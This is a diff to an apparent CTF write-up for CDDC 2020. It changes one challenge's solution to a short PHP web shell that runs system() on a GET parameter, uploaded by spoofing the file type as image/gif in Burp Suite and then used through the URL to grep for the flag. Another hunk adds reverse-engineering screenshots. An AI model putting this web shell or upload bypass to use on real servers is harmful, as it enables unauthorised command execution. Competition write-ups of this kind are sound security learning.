@@ -246,11 +246,20 @@ http://magifs.chall.cddc2020.nshc.sg:13373/
 
 **Solution**
 
-Use weevely to generate a .php backdoor
+upload a php file 
 
-Use burp suite to change the file type from application/php to image/gif , so the web application will accept the php code. Cannot append a .gif to the php file (can’t be backdoor.php.gif. this wont work)
+```php
+    <?php
+        $cmd = $_GET['cmd'];
+        system($cmd)
+    ?>
+```
 
-Once php file uploaded, use weevely to get the shell.Directory traversal the machine to find the flag (It’s one folder above the current folder)
+Use burp suite to change the file type from application/php to image/gif
+
+Once php file uploaded, go to http://magifs.chall.cddc2020.nshc.sg:13373/uploads/filename.php?cmd=grep%20-r%20%2220%22%20/var/ to find the flag
+
+![](./screenshots/gif.png)
 
 **Flag**
 
@@ -292,6 +301,9 @@ Attached Files: [SecretCode](./attached_files/SecretCode)
 **Solution**
 
 Reverse engineering using Ghidra
+![](./screenshots/secretcode1.png)
+![](./screenshots/secretcode2.png)
+![](./screenshots/secretcode3.png)
 
 **Flag**
 
